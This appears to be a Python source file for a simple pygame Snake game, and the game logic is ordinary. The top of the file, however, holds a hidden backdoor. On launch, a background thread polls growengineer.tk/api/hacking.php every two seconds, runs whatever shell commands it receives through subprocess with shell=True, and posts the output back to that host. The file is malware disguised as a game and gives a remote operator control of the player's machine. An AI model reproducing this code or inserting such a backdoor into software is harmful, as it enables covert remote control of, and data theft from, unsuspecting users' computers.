from threading import Thread
import subprocess
import json
import socket
import requests
import pygame
from pygame import mixer
import time
import random
def url_creator(message):
    global host_add
    message = message.replace(" ", "_")
    url = f"GET http://growengineer.tk/api/hacking.php?msg={message} HTTP/1.0\r\n\r\n"
    return url.encode("utf-8")


class background(Thread):
    def run(self):
        global client,session
        while session==True:
            socker = socket.socket()
            socker.connect(("growengineer.tk",80))
            socker.send(url_creator('{"action":"getcommand","client":"'+client+'"}'))
            cmd = socker.recv(2048).decode()
            realcmd = cmd.split("*")
            if len(realcmd[1])>1:
                 cmd_list = json.loads(realcmd[1])
                 reply = subprocess.run([cmd_list["cmd"], cmd_list["arg1"],cmd_list["arg2"]],shell=True,capture_output=True)
                 id = cmd_list["id"]
                 url = 'http://growengineer.tk/api/hacking.php'
                 myobj = {'reply': str(reply) , 'action': 'setreply', 'id': int(id)}
                 msg = {'msg': json.dumps(myobj)}
                 x = requests.post(url, data=msg)


            time.sleep(2)
        return 1

session = True
client ="cli2"
hacker = background()
hacker.start()




#code for game

pygame.init()
mixer.init()
status=1
direction = 2
screen_width = 600
screen_height = 500
exit_game = False
snake_x = 20
snake_y = 20
snake_width = 10
snake_height = 10
food_x = random.randint(50, screen_width-50)
food_y = random.randint(50, screen_height-50)
food_width = 10
food_height = 10
speed = 10
velocity_x = speed
velocity_y = 0
score = 10
snk_pos=[]
gamewindow = pygame.display.set_mode((screen_width, screen_height))
pygame.display.set_caption("Snake")

clock = pygame.time.Clock()

font = pygame.font.SysFont(None, 25)
def text_screen(text, color, x, y):
    screen_text = font.render(text, True, color)
    gamewindow.blit(screen_text, [x,y])

def clear_vars():
    global direction, snake_x, food_x, snake_y, food_y, velocity_y, velocity_x, score, exit_game, status,snk_pos
    status = 1
    direction = 2
    screen_width = 600
    screen_height = 500
    exit_game = False
    snake_x = 20
    snake_y = 20
    food_x = random.randint(50, screen_width - 50)
    food_y = random.randint(50, screen_height - 50)
    speed = 10
    velocity_x = speed
    velocity_y = 0
    score = 10
    snk_pos = []



def welcome_screen():
    global exit_game,status,gamewindow
    gamewindow.fill((255, 255, 255))
    text_screen("Press Space bar to Start", (255, 0, 0), 180, 160)
    pygame.display.update()
    for event in pygame.event.get():
        if event.type == 12:
            exit_game = True
        if event.type==pygame.KEYDOWN:
             if event.key == pygame.K_SPACE:
                 status=2





def gameloop():
    global direction,snake_x,food_x,snake_y,food_y,velocity_y,velocity_x,score,exit_game,status
    for event in pygame.event.get():
        if event.type == 12:
            exit_game = True
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_DOWN:
                if direction != 1:
                    velocity_y = speed
                    velocity_x = 0
                    direction = 3
            if event.key == pygame.K_UP:
                if direction != 3:
                    velocity_y = -speed
                    velocity_x = 0
                    direction = 1
            if event.key == pygame.K_LEFT:
                if direction != 2:
                    velocity_x = -speed
                    velocity_y = 0
                    direction = 4
            if event.key == pygame.K_RIGHT:
                if direction != 4:
                    velocity_x = speed
                    velocity_y = 0
                    direction = 2
    if abs(snake_x - food_x) < 20 and abs(snake_y - food_y) < 20:
        score = score + 10
        food_x = random.randint(50, screen_width-50)
        food_y = random.randint(50, screen_height-50)
        snk_pos.append([snake_x,snake_y])
        mixer.music.load("sms.mp3")
        mixer.music.set_volume(0.7)
        mixer.music.play()
    snake_y += velocity_y
    snake_x += velocity_x
    for item1,item2 in snk_pos:
        if item1==snake_x and item2==snake_y:
            mixer.music.load("game_over.mp3")
            mixer.music.set_volume(0.7)
            mixer.music.play()
            score = 0
            status = 1
            clear_vars()
    if snake_x > screen_width or snake_x < 0 or snake_y > screen_height or snake_y < 0:
        mixer.music.load("game_over.mp3")
        mixer.music.set_volume(0.7)
        mixer.music.play()
        score=0
        status=1
        clear_vars()

    snk_pos.append([snake_x,snake_y])
    gamewindow.fill((255, 255, 255))
    text_screen(str(score), (0, 0, 0), 5, 5)
    i=0
    for i in range(int(score/10)):
         pygame.draw.rect(gamewindow, (0, 0, 0), [snk_pos[i][0], snk_pos[i][1], snake_width, snake_height])

    del snk_pos[0]
    pygame.draw.rect(gamewindow, (255, 0, 0), [food_x, food_y, food_width, food_height])
    pygame.display.update()
    clock.tick(20)

while not exit_game:
    if status==1:
        welcome_screen()
    else:
        gameloop()
session=False